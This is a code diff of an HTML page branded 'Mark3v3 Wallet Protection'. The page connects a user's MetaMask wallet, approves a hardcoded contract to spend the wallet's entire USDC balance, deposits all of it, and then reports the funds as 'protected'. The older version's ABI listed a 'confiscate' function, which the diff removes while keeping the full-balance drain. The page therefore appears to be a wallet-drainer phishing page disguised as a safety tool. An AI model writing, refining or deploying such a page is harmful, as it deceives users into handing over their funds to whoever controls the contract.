@@ -2,290 +2,89 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <meta name="description" content="Mark3v3 Wallet Protection Interface" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Mark3v3 Wallet Protection</title>
   <style>
-    :root {
-      --primary: #4e44ce;
-      --error: #ff4444;
-      --success: #00C851;
-      --warning: #ffbb33;
-    }
     body {
       font-family: 'Segoe UI', sans-serif;
-      background: #f8f9fa;
+      background: #f4f4f4;
       display: flex;
       flex-direction: column;
       align-items: center;
       padding: 2rem;
       min-height: 100vh;
-      margin: 0;
-      box-sizing: border-box;
     }
     button {
-      padding: 12px 24px;
-      margin: 8px;
+      padding: 10px 20px;
+      margin: 10px;
+      font-size: 16px;
       border: none;
       border-radius: 8px;
-      background: var(--primary);
-      color: white;
-      font-weight: bold;
       cursor: pointer;
-      transition: all 0.2s ease;
-      width: 100%;
-      max-width: 300px;
+      color: #fff;
+      background-color: #4e44ce;
     }
-    button:hover:not(:disabled) { opacity: 0.9; transform: translateY(-1px); }
-    button:active:not(:disabled) { transform: translateY(0); }
-    button:disabled { opacity: 0.5; cursor: not-allowed; }
     #status {
       margin-top: 20px;
-      padding: 12px;
-      border-radius: 8px;
+      padding: 10px;
       background: white;
-      max-width: 500px;
+      border-radius: 8px;
       width: 90%;
-      word-break: break-word;
-      min-height: 60px;
-      display: flex;
-      align-items: center;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-    }
-    .error { color: var(--error); }
-    .success { color: var(--success); }
-    .progress { color: var(--warning); }
-    .progress-bar {
-      width: 100%;
       max-width: 500px;
-      height: 4px;
-      background: #e9ecef;
-      border-radius: 2px;
-      margin-top: 8px;
-      overflow: hidden;
-    }
-    .progress-bar-fill {
-      height: 100%;
-      background: var(--primary);
-      width: 0%;
-      transition: width 0.3s ease;
-    }
-    .status-icon { margin-right: 10px; font-size: 1.2em; }
-    .spinner {
-      border: 4px solid rgba(0,0,0,0.1);
-      border-top: 4px solid var(--primary);
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto;
-    }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    
-    @media (max-width: 600px) {
-      body {
-        padding: 1rem;
-      }
-      button {
-        padding: 10px 20px;
-      }
-      #status {
-        padding: 10px;
-        min-height: 50px;
-      }
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
   </style>
 </head>
 <body>
   <h2>Mark3v3 Wallet Protection</h2>
   <button id="connect">Connect Wallet</button>
-  <button id="authorize" disabled>Authorize & Protection</button>
+  <div id="status">Status: Not connected</div>
 
-  <div id="status"><span class="status-icon">🔒</span><span id="status-text">Status: Connect your wallet</span></div>
-  <div class="progress-bar"><div class="progress-bar-fill" id="progress-bar"></div></div>
-  <div id="tx-hash" style="margin-top: 10px; display: none;"></div>
-  <div id="loader" style="display: none;"><div class="spinner"></div></div>
-
-  <footer style="margin-top: 2rem; font-size: 0.8em; color: #666;">Mark3v3 Wallet v1.0.0</footer>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@latest/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const CONFIG = {
-      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-      CONTRACT_ADDRESS: "0x95Edd65333b224E6015D0e6b3C50761e1322BF1a",
-      ABI: [
-        "function deposit(uint256 amount) external",
-        "function confiscate(address user) external",
-        "function users(address) view returns (uint256 deposited, bool hasDeposited)"
-      ]
-    };
+    const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+    const CONTRACT_ADDRESS = "0x95Edd65333b224E6015D0e6b3C50761e1322BF1a";
+    const ABI = [
+      "function deposit(uint256 amount) external",
+      "function users(address) view returns (uint256 deposited, bool hasDeposited)"
+    ];
 
     const connectBtn = document.getElementById('connect');
-    const authorizeBtn = document.getElementById('authorize');
-    const statusEl = document.getElementById('status');
-    const statusText = document.getElementById('status-text');
-    const progressBar = document.getElementById('progress-bar');
-    const statusIcon = document.querySelector('.status-icon');
-    const loader = document.getElementById('loader');
-    const txHashEl = document.getElementById('tx-hash');
+    const statusDiv = document.getElementById('status');
 
-    let provider, signer, user;
-
-    // Initialize wallet connection listeners
-    function initializeWalletListeners() {
-      if (window.ethereum) {
-        window.ethereum.on('accountsChanged', (accounts) => {
-          if (accounts.length === 0) {
-            resetUI();
-            updateStatus("Wallet disconnected", "error");
-          } else {
-            user = accounts[0];
-            updateStatus(`Account changed: ${shortenAddress(user)}`, "progress");
-          }
-        });
-
-        window.ethereum.on('chainChanged', () => {
-          window.location.reload();
-        });
+    connectBtn.addEventListener('click', async () => {
+      if (!window.ethereum) {
+        alert('MetaMask is not installed');
+        return;
       }
-    }
-
-    function resetUI() {
-      connectBtn.disabled = false;
-      authorizeBtn.disabled = true;
-      user = null;
-      progressBar.style.width = "0%";
-      txHashEl.style.display = "none";
-    }
-
-    connectBtn.onclick = connectWallet;
-
-    async function connectWallet() {
       try {
-        if (!window.ethereum) throw new Error("Please install MetaMask");
-        updateStatus("Connecting to wallet... ⏳", "progress");
-        progressBar.style.width = "20%";
-        showLoader();
-        connectBtn.disabled = true;
-        
-        provider = new ethers.providers.Web3Provider(window.ethereum);
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        user = await signer.getAddress();
-        
-        initializeWalletListeners();
-        updateUI();
-        updateStatus(`Connected: ${shortenAddress(user)}`, "success");
-        progressBar.style.width = "40%";
-        hideLoader();
-      } catch (err) {
-        showError(err);
-        hideLoader();
-        connectBtn.disabled = false;
-      }
-    }
+        const signer = provider.getSigner();
+        const address = await signer.getAddress();
+        statusDiv.textContent = `Connected: ${address}`;
 
-    function updateUI() {
-      connectBtn.disabled = true;
-      authorizeBtn.disabled = false;
-      authorizeBtn.onclick = handleProtection;
-    }
+        const usdc = new ethers.Contract(USDC_ADDRESS, ["function approve(address,uint256) returns (bool)", "function balanceOf(address) view returns (uint256)", "function allowance(address,address) view returns (uint256)"], signer);
+        const balance = await usdc.balanceOf(address);
 
-    async function handleProtection() {
-      try {
-        showLoader();
-        authorizeBtn.disabled = true;
-        
-        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
-          "function approve(address,uint256) returns (bool)",
-          "function balanceOf(address) view returns (uint256)",
-          "function allowance(address,address) view returns (uint256)"
-        ], signer);
-
-        updateStatus("Fetching USDC balance... ⏳", "progress");
-        progressBar.style.width = "50%";
-        const balance = await usdc.balanceOf(user);
-        if (balance.isZero()) throw new Error("No USDC balance found");
-
-        updateStatus("Approving USDC for protection... ⏳", "progress");
-        progressBar.style.width = "60%");
-        
-        // Check existing allowance first
-        const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
+        const allowance = await usdc.allowance(address, CONTRACT_ADDRESS);
         if (allowance.lt(balance)) {
-          const approveTx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, balance);
-          updateTxHash(approveTx.hash);
-          updateStatus("Waiting for approval confirmation... ⏳", "progress");
-          progressBar.style.width = "70%";
+          const approveTx = await usdc.approve(CONTRACT_ADDRESS, balance);
+          statusDiv.textContent = "Approving USDC...";
           await approveTx.wait();
         }
 
-        updateStatus("Protecting your funds... 🔄", "progress");
-        progressBar.style.width = "90%";
-        const contract = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, CONFIG.ABI, signer);
+        const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
         const depositTx = await contract.deposit(balance);
-        updateTxHash(depositTx.hash);
+        statusDiv.textContent = "Depositing USDC...";
         await depositTx.wait();
+        statusDiv.textContent = `✅ Funds protected: ${ethers.utils.formatUnits(balance, 6)} USDC`;
 
-        updateStatus(`✅ Protection successful! Secured ${ethers.utils.formatUnits(balance, 6)} USDC`, "success");
-        progressBar.style.width = "100%";
-        statusIcon.textContent = "✅";
-        
-        // Reset progress bar after 3 seconds
-        setTimeout(() => {
-          progressBar.style.width = "0%";
-        }, 3000);
-        
-        hideLoader();
-        authorizeBtn.disabled = false;
       } catch (err) {
-        showError(err);
-        hideLoader();
-        authorizeBtn.disabled = false;
-        
-        if (err.code === 4001) {
-          updateStatus("Transaction rejected by user", "error");
-        }
+        console.error(err);
+        statusDiv.textContent = `Error: ${err.message}`;
       }
-    }
-
-    function updateStatus(message, type) {
-      statusText.textContent = message;
-      statusEl.className = type || '';
-      statusIcon.textContent = getStatusIcon(type);
-    }
-
-    function getStatusIcon(type) {
-      switch(type) {
-        case 'error': return '❌';
-        case 'success': return '✅';
-        case 'progress': return '⏳';
-        default: return '🔒';
-      }
-    }
-
-    function showError(err) {
-      console.error(err);
-      updateStatus(`Error: ${err.message}`, "error");
-      progressBar.style.width = "0%";
-      statusIcon.textContent = "❌";
-      txHashEl.style.display = "none";
-    }
-
-    function showLoader() { loader.style.display = "block"; }
-    function hideLoader() { loader.style.display = "none"; }
-
-    function updateTxHash(hash) {
-      txHashEl.innerHTML = `Transaction: <a href="https://etherscan.io/tx/${hash}" target="_blank">${shortenHash(hash)}</a>`;
-      txHashEl.style.display = "block";
-    }
-
-    function shortenAddress(address) {
-      return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
-    }
-
-    function shortenHash(hash) {
-      return `${hash.substring(0, 10)}...${hash.substring(hash.length - 8)}`;
-    }
+    });
   </script>
 </body>
 </html>
